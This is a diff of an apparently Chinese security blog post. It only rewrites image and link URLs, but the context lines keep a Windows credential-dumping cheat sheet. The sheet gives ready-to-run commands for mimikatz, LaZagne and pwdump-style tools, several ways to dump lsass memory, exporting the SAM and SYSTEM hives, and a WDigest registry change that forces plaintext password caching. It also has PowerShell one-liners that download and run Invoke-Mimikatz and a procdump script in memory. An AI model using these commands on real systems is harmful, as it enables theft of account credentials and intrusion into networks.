@@ -173,27 +173,27 @@ window.onload=getCSS();
 <p>https://github.com/gentilkiwi/mimikatz</p>
 <pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582465339806.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1582465339806.png" alt="" loading="lazy"></figure>
 <h4 id="quarkspwdump">QuarksPwDump</h4>
 <p>https://github.com/quarkslab/quarkspwdump</p>
 <pre><code>QuarksPwDump.exe -dhl
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582466664583.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1582466664583.png" alt="" loading="lazy"></figure>
 <h4 id="wce">wce</h4>
 <p>https://www.ampliasecurity.com/research/wcefaq.html</p>
 <pre><code>wce.exe -w
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582468276845.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/1582468276845.png" alt="" loading="lazy"></figure>
 <h4 id="pwdump7">pwdump7</h4>
 <p>http://www.tarasco.org/security/pwdump_7/index.html</p>
 <pre><code>PwDump7.exe
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1582469996459.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/1582469996459.png" alt="" loading="lazy"></figure>
 <h4 id="lazagne">LaZagne</h4>
 <p>https://github.com/AlessandroZ/LaZagne</p>
 <pre><code>laZagne_x86.exe windows
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1582470996820.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/1582470996820.png" alt="" loading="lazy"></figure>
 <h3 id="lsass内存dump">lsass内存dump</h3>
 <p>工具仅部分，通过以下操作可先获取到lsass内存文件，然后使用mimikatz可进一步读取密码。<br>
 参考命令:</p>
@@ -203,22 +203,22 @@ window.onload=getCSS();
 <p>https://github.com/GhostPack/SharpDump</p>
 <pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do SharpDump.exe %i
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1582476581586.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/1582476581586.png" alt="" loading="lazy"></figure>
 <h4 id="procdump">ProcDump</h4>
 <p>https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</p>
 <pre><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
 </code></pre>
-<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1582471683393.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/1582471683393.png" alt="" loading="lazy"></figure>
 <h4 id="sqldumper">SqlDumper</h4>
 <p>https://support.microsoft.com/en-us/help/917825/use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-server</p>
 <pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do Sqldumper.exe %i 0 0x01100
 </code></pre>
-<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1582473006736.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/1582473006736.png" alt="" loading="lazy"></figure>
 <h4 id="rundll32">rundll32</h4>
 <p>https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/</p>
 <pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %i .\lsass.dmp full
 </code></pre>
-<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1582475904292.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/1582475904292.png" alt="" loading="lazy"></figure>
 <h3 id="关于sam数据库">关于SAM数据库</h3>
 <p>管理员执行:</p>
 <pre><code>reg save hklm\sam .\sam.hive&amp;reg save hklm\system .\system.hive
@@ -227,11 +227,11 @@ window.onload=getCSS();
 <h3 id="关于无文件加载">关于无文件加载</h3>
 <pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
 </code></pre>
-<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1582480293151.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/1582480293151.png" alt="" loading="lazy"></figure>
 <p>读一下代码会发现都是peloader做的，同理可以把procdump做成psh实现无文件dump。</p>
 <pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
 </code></pre>
-<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1582492124419.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/1582492124419.png" alt="" loading="lazy"></figure>
 <h3 id="关于2012以及win10之后的机器">关于2012以及win10之后的机器：</h3>
 <pre><code>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 </code></pre>
@@ -249,19 +249,19 @@ window.onload=getCSS();
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://thekingofduck.github.io/tag/L05rqtZDv/" rel="tag">hashdump</a>	
+				<a href="https://blog.thekingofduck.com/tag/L05rqtZDv/" rel="tag">hashdump</a>	
 				 
-				<a href="https://thekingofduck.github.io/tag/zclWlajBkL/" rel="tag">安全工具</a>	
+				<a href="https://blog.thekingofduck.com/tag/zclWlajBkL/" rel="tag">安全工具</a>	
 				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://thekingofduck.github.io/post/CVE-2020-8840/" rel="prev"> CVE-2020-8840复现</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://blog.thekingofduck.com/post/CVE-2020-8840/" rel="prev"> CVE-2020-8840复现</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/ApkAnalyser/" rel="next"> ApkAnalyser：一键提取安卓应用中可能存在的敏感信息。</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://blog.thekingofduck.com/post/ApkAnalyser/" rel="next"> ApkAnalyser：一键提取安卓应用中可能存在的敏感信息。</a></div>
 		
 		</div>
 	</nav>
